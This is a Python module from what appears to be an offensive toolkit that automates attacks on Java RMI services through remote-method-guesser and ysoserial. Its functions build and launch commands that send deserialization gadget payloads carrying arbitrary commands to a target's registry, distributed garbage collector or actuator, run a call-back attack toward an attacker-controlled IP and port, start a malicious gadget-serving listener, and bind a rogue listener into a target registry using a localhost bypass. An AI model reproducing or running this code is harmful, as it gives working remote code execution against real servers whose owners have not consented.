import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.terminalUtils as tu
import ZHOR_Modules.jsonUtils as jsu
import os
import socket

CONFIG = jsu.loadConfig()
CHOSEN_JAVA_VERSION = None

# components to attack: act = actuator, dgc = distributed garbage collector, reg = registry
COMPONENTS = ['act','reg','dgc']
CHOSEN_COMPONENT = None

# kills xterm windows
def killXTerm():
    os.system("killall xterm")

# true  ---> port in use
# false ---> port free
def portInUse(port: int) -> bool:
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex((CONFIG['our-ip'], port)) == 0


class _RMGSerial():
    global CHOSEN_JAVA_VERSION
    
    
    def __init__(self):
        pass

    # rmg serial <target ip> <target port> AnTrinh <our ip>:<our port> --component reg 
    def start_AnTrinh(self,targetIP: str, targetPort: str):
        com = '"{}" -jar "{}" serial {} {} AnTrinh {}:{} --component {} --yso "{}"'.format(
            CONFIG['java-executables'][CHOSEN_JAVA_VERSION],
            CONFIG['rmg-executable-location'],
            targetIP,
            targetPort,
            CONFIG['our-ip'],
            CONFIG['our-port'],
            CHOSEN_COMPONENT,
            CONFIG['ysoserial-path']
        )

        com += "; sleep 999999"
        wTitle = "SERIAL --- {}:{}".format(targetIP,targetPort)

        msg = "[{}] {}".format("SERIAL",com)
        np.debugPrint(msg)
        tu.spawn_xterm_b64(com,windowTitle=wTitle,executeInBackground=True,xPos=500)

    # java -jar rmg serial <target ip> <target port> <command> --component reg --yso <ysoserial.jar path>      
    def start_Serial(self,targetIP: str, targetPort: str,gadget: str,command: str):
        com = '"{}" -jar "{}" serial {} {} {} "{}" --component {} --yso "{}"'.format(
            CONFIG['java-executables'][CHOSEN_JAVA_VERSION],
            CONFIG['rmg-executable-location'],
            targetIP,
            targetPort,
            gadget,
            command,
            CHOSEN_COMPONENT,
            CONFIG['ysoserial-path']
        )

        msg = "[{}] {}".format("SERIAL",com)
        np.debugPrint(msg)
        os.system(com)
    
class _RMGListen():
    global CHOSEN_JAVA_VERSION
    
    def __init__(self):
        pass

    # rmg listen <our ip> <our port> <yso gadget> 'command to execute' --yso <ysoserial path>
    def start(self,gadget: str,command:str):
        com = '"{}" -jar "{}" listen {} {} {} "{}" --yso "{}"'.format(
            CONFIG['java-executables'][CHOSEN_JAVA_VERSION],
            CONFIG['rmg-executable-location'],
            CONFIG['our-ip'],
            CONFIG['our-port'],
            gadget,
            command,
            CONFIG['ysoserial-path']
        )
        com += "; sleep 999999"
        wTitle = "LISTEN --- {}:{} --- {}".format(CONFIG['our-ip'],CONFIG['our-port'],gadget)

        msg = "[{}] {}".format("LISTEN",com)
        np.debugPrint(msg)
        tu.spawn_xterm_b64(com,windowTitle=wTitle,executeInBackground=True)

    # java -jar rmg-5.0.0-jar-with-dependencies.jar bind 10.20.30.40 24407 20.30.40.50:4444 jmxrmi --localhost-bypass   
    def listenerInject(self,targetIP: str, targetPort: str):
        com = '"{}" -jar "{}" bind {} {} {}:{} jmxrmi --localhost-bypass'.format(
            CONFIG['java-executables'][CHOSEN_JAVA_VERSION],
            CONFIG['rmg-executable-location'],
            targetIP,
            targetPort,
            CONFIG['our-ip'],
            CONFIG['our-port']
        )
        com += "; sleep 999999"
        wTitle = "LISTENER INJECT --- {}:{}".format(targetIP,targetPort)

        msg = "[{}] {}".format("LISTEN",com)
        np.debugPrint(msg)
        tu.spawn_xterm_b64(com,windowTitle=wTitle,executeInBackground=True)
        
RMGListen = _RMGListen()
RMGSerial = _RMGSerial()
